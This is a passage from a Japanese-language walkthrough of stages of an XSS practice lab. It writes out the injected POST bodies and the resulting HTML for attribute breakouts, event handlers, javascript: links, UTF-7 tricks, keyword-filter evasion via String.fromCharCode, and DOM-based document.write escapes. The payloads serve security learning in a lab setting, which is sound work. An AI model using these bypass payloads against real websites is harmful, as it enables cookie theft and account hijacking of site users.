![image](https://user-images.githubusercontent.com/56021519/103072736-8120ea00-4609-11eb-80af-8680a479fc56.png)   
`"><script>alert(document.domain);</script>`をselect countryにいれてもいけるらしい   
POSTを書き換える。   
```txt
p1=a&p2=%22%3E%3Cscript%3Ealert%28document.domain%29%3B%3C%2Fscript%3E
```
![image](https://user-images.githubusercontent.com/56021519/103072714-7403fb00-4609-11eb-8e86-d7cba0dddb0e.png)   

### 4 (bypas \<input type="hidden" value="">)
![image](https://user-images.githubusercontent.com/56021519/103072902-e2e15400-4609-11eb-8d2e-27f8f22a8bef.png)   
hackmeというパラメータが送信されている。   
```txt
p1=aaa&p2=Japan&p3=hackme
```
`"><script>alert(document.domain);</script>`をhackmeの後に着けると成功！   
```txt
p1=a&p2=Japan&p3=hackme%22%3E%3Cscript%3Ealert%28document.domain%29%3B%3C%2Fscript%3E
```
```txt
</select>
<input type="hidden" name="p3" value="hackme">
<script>alert(document.domain);</script>
">
<hr class=red>
```
### 5 (bypass maxlength="15")
![image](https://user-images.githubusercontent.com/56021519/103073265-af52f980-460a-11eb-918b-b241b0f53785.png)   
以下を送信してみる。   
```txt
p1=aaa%3Cscript%3Ealert%28document.domain%29%3B%3C%2Fscript%3E
```
以下が返る。`maxlength="15"`に設定されているのでBurpから編集する。   
```txt
<form action="?sid=950789ec9535788b7bc7651d8b31bd7b63c3ecb9" method="post">
<hr class=red>No results for your Query. Try again: <input type="text" name="p1" 
maxlength="15" size="30" value="aaa<script>alert(document.domain);</script>"> 
<input type="submit" value="Search">
```
さっきと同じで成功！   
```txt
p1=aaa%22%3E%3Cscript%3Ealert%28document.domain%29%3B%3C%2Fscript%3E
```
### 6 (fileter "<>")
![image](https://user-images.githubusercontent.com/56021519/103073664-56379580-460b-11eb-8659-4a5f39796123.png)   
以下を送信する。   
```txt
p1=aaa%3Cscript%3Ealert%28document.domain%29%3B%3C%2Fscript%3E
```
以下が返るので、`<>`がエスケープされてる。   
```txt
<form action="?sid=222f0be5885c36dac3576a0821f5c018691232fa" method="post">
<hr class=red>No results for your Query. Try again: <input type="text" name="p1" 
size="50" value="aaa&lt;script&gt;alert(document.domain);&lt;/script&gt;"> <input 
type="submit" value="Search">
```
以下で成功！   
```txt
" onclick="alert(document.domain);
```
### 7 (inject \<input value= > with no quote)
![image](https://user-images.githubusercontent.com/56021519/103073917-d231dd80-460b-11eb-9dd9-76c646bfc5af.png)   
さっきと同じやつを送信してみる。   
```txt
p1=%22+onclick%3D%22alert%28document.domain%29%3B
```
`"`,`'`が使えない。   
```txt
<hr class=red>No results for your Query. Try again: <input type="text" name="p1" size="50" value=&quot; onclick=&quot;alert(document.domain);> <input type="submit" value="Search">
```
よく見ると`value=aaaa`となっていて`"`がない。   
```txt
<hr class=red>No results for your Query. Try again: <input type="text" name="p1" size="50" value=aaaaaa> <input type="submit" value="Search">
```
`hogehoge onmouseover=alert(document.domain)`のようにスペースを入れると普通に成功！   
```txt
<hr class=red>No results for your Query. Try again: <input type="text" name="p1" size="50" value=hogehoge onmouseover=alert(document.domain)> <input type="submit" value="Search">
```
### 8 (href)
![image](https://user-images.githubusercontent.com/56021519/103074774-a3b50200-460d-11eb-9be0-0634932f4d3d.png)   
以下のようになる。   
```txt
<hr class=red>URL: <a href="aaaa">aaaa</a><hr class=red>
```
`javascript:alert(document.domain);`で成功！   
### 9 (UTF-7 XSS)
![image](https://user-images.githubusercontent.com/56021519/103074929-f2629c00-460d-11eb-8b0a-8b8bf88063dd.png)   

```txt
p1=aaaaa&charset=euc-jpbbbbbb
```
```txt
Content-Type: text/html; charset=euc-jpbbbbbb
Content-Length: 1817

<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=euc-jpbbbbbb">
  
// 省略
<input type="text" name="p1" size="50" value="aaaaa">
```
`"><script>alert(document.domain);</script>`をそれぞれに送信してみると`"`がエスケープされてるぽい。   
```txt
Content-Type: text/html; charset=euc-jp&quot;&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;
Content-Length: 1934

<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=euc-jp&quot;&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;">
  <script language="JavaScript" type="text/javascript" charset="euc-jp" src="script.js">
```
以下のように改行をいれたHTTP Header Injectionを試す。   
```txt
aaa

<script>alert(document.domain);</script>
```
ダメっぽい…   
```txt
Content-Type: text/html; charset=UTF-8
Content-Length: 1868

<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=euc-jpaaa

&lt;script&gt;alert(document.domain);&lt;/script&gt;">
```
IEではcontent-typeが明示されてないと、UTF-7で書かれてると判断してXSSが可能らしい。   
UTF-7のXSSができるらしいがなんかうまく行ってない…   
```txt
p1=ffff%2BACI-+onmouseover%3D%2BACI-alert%28document.domain%29&charset=euc-jpffff%2BACI-+onmouseover%3D%2BACI-alert%28document.domain%29
```
これでIEでは`value="ffff" onmouseover="alert(document.domain)">`となっていけるはずだがなんかうまく行ってない   
IEのバージョンか？   
writeupでもうまく行かなかったって言ってる。   
```txt
Content-Type: text/html; charset=euc-jpffff+ACI- onmouseover=+ACI-alert(document.domain)

<input type="text" name="p1" size="50" value="ffff+ACI- onmouseover=+ACI-alert(document.domain)">
```
### 10 (filter "domain")
![image](https://user-images.githubusercontent.com/56021519/103078634-a7e51d80-4615-11eb-8338-6714f148dacc.png)   
さっきと同じ`"><script>alert(document.domain);</script>`を送信すると`domain`という文字がフィルタリングされている。   
```txt
No results for your Query. Try again: 
<input type="text" name="p1" size="50" value="bbb">
<script>alert(document.);</script>
"> 
```
以下で文字列を生成して、`"><script>eval(`${String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41)}`)</script>`で`eval("alert(document.domain)")`と同じことをすると成功！   
```python
S = """alert(document.domain)"""

C = []
for s in S:
    C.append(ord(s))

print("${" + "String.fromCharCode({})".format(",".join(list(map(str, C)))) + "}")
# ${String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41)}
```
そもそも`"><script>alert(document.domdomainain);</script>`でいけたは…   
ちなみに、`” onmouseover=alert(document.domdomainain); x=”`でマウスをinpuの中にセットすれば行けるはずだけどなんかうまく行ってない…   
![image](https://user-images.githubusercontent.com/56021519/103080190-abc66f00-4618-11eb-9472-12257140c6eb.png)   
### 11 ページが動いてない…
### 12 IE
### 13 IE
### 14 IE
### 15 (DOM based document.write)
![image](https://user-images.githubusercontent.com/56021519/103081721-d9f97e00-461b-11eb-8b77-e1cac3afe6b7.png)   
`");alert(xss);//`を入力すると`"`がエスケープされてる…      
```txt
<script>document.write("&quot;);alert(xss);//");</script>
```
DOM basedでなければ`"`をBypassする方法はない(?)が、今回はDOM basedで`document.write()`の中に入力が入るので、`\\x3cscript\\x3ealert(document.domain);\\x3c/script\\x3e`を入力すると一見できなそうだけどXSSできる！   
これは`<script>alert(document.domain)</script>`と同じ！   
```txt
<script>
document.write("\x3cscript\x3ealert(document.domain);\x3c/script\x3e");
</script>
```
https://macchinetta.github.io/server-guideline/current/ja/Security/XSS.html   
詳細はここにある。   
### 16 ページが動いてない

### 17 IE
### 18 IE
### 19 ページが動いてない

## 動作環境ナシ
### XSS Challenge(セキュリティ・ミニキャンプ in 岡山 2018)
https://szarny.hatenablog.com/entry/2019/01/01/XSS_Challenge_%28%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3%E3%83%BB%E3%83%9F%E3%83%8B%E3%82%AD%E3%83%A3%E3%83%B3%E3%83%97_in_%E5%B2%A1%E5%B1%B1_2018_%E6%BC%94%E7%BF%92%E3%82%B3%E3%83%B3   
https://graneed.hatenablog.com/entry/2018/11/23/222842   
### katagaitaiCTF#9 xss千本ノック
http://sec-rookie.hatenablog.com/entry/2017/08/29/015957   
https://exploit.moe/2017-08-28/katagaitaiCTF9-writeup   






